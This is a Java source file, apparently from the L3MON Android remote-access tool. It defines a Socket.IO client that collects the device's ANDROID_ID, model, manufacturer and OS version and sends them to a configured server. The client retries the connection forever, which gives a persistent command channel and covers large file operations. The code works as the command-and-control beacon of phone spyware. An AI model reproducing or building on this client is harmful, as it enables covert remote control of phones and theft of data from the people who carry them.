package com.etechd.l3mon.core.network;

import android.content.ContentResolver;
import android.provider.Settings;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;
import com.etechd.l3mon.core.config.Config;

import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketClient {

    private static final String TAG = "SocketClient";
    private static final SocketClient INSTANCE = new SocketClient();
    private static final String EVENT_CONNECT_TIMEOUT = "connect_timeout";
    private static final String EVENT_RECONNECT_ATTEMPT = "reconnect_attempt";
    private static final String EVENT_ERROR = "error";

    private Socket ioSocket;

    private SocketClient() {
        initializeSocket();
    }

    private synchronized void initializeSocket() {
        try {
            String deviceId = "unknown";
            try {
                ContentResolver resolver = L3monApp.getContext().getContentResolver();
                String androidId = Settings.Secure.getString(resolver, Settings.Secure.ANDROID_ID);
                if (androidId != null) {
                    deviceId = androidId;
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to fetch ANDROID_ID", e);
            }

            String query = String.format(
                    "model=%s&manf=%s&release=%s&id=%s",
                    urlEncode(android.os.Build.MODEL),
                    urlEncode(android.os.Build.MANUFACTURER),
                    urlEncode(android.os.Build.VERSION.RELEASE),
                    urlEncode(deviceId)
            );

            IO.Options options = new IO.Options();
            options.reconnection = true;
            options.reconnectionAttempts = Integer.MAX_VALUE;
            options.reconnectionDelay = 5000;
            options.timeout = 30000; // Increased timeout for large file operations
            options.query = query;
            options.path = Config.SOCKET_PATH;
            options.secure = Config.SERVER_USE_HTTPS;
            options.forceNew = false; // Reuse existing connection
            options.upgrade = true;
            options.rememberUpgrade = true;

            ioSocket = IO.socket(Config.getSocketEndpoint(), options);
            registerLifecycleHandlers();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Invalid socket URI", e);
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error creating socket", e);
        }
    }

    private String urlEncode(String value) {
        return URLEncoder.encode(value != null ? value : "", StandardCharsets.UTF_8);
    }

    public static SocketClient getInstance() {
        return INSTANCE;
    }

    public synchronized Socket getSocket() {
        if (ioSocket == null) {
            initializeSocket();
        }
        return ioSocket;
    }

    private void registerLifecycleHandlers() {
        if (ioSocket == null) {
            return;
        }

        ioSocket.on(Socket.EVENT_CONNECT, args -> Log.i(TAG, "Socket connected"));
        ioSocket.on(Socket.EVENT_DISCONNECT, args -> Log.w(TAG, "Socket disconnected: " + (args.length > 0 ? args[0] : "unknown")));
        ioSocket.io().on(EVENT_CONNECT_TIMEOUT, args -> Log.w(TAG, "Socket connection timeout"));
        ioSocket.io().on(EVENT_RECONNECT_ATTEMPT, args -> Log.d(TAG, "Attempting socket reconnect"));
        ioSocket.on(Socket.EVENT_CONNECT_ERROR, args -> logSocketError("connect_error", args));
        ioSocket.io().on(EVENT_ERROR, args -> logSocketError(EVENT_ERROR, args));
    }

    private void logSocketError(String event, Object[] args) {
        if (args != null && args.length > 0 && args[0] instanceof Exception) {
            Log.e(TAG, "Socket " + event, (Exception) args[0]);
        } else {
            Log.e(TAG, "Socket " + event + " -> " + Arrays.toString(args));
        }
    }
}
